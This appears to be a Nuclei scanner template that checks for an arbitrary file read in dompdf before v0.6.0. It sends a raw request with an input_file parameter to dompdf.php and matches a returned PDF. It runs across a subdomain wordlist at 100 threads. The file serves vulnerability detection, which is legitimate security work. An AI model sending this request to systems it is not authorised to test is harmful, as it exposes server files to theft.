id: arbitrary-file-read-in-dompdf 4
info:
  author: 0x_Akoko
  name: Arbitrary file read in dompdf < v0.6.0
  reference: https://www.exploit-db.com/exploits/33004
  severity: high
  tags: dompdf,lfi
requests:
- attack: sniper
  matchers:
  - condition: and
    part: header
    type: word
    words:
    - application/pdf
    - filename="dompdf_out.pdf"
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - "GET /includes/dompdf/dompdf.php?input_file=dompdf.php HTTP/1.1\nHost: {{Subdomains}}\n\
    \                        \n"
  threads: 100
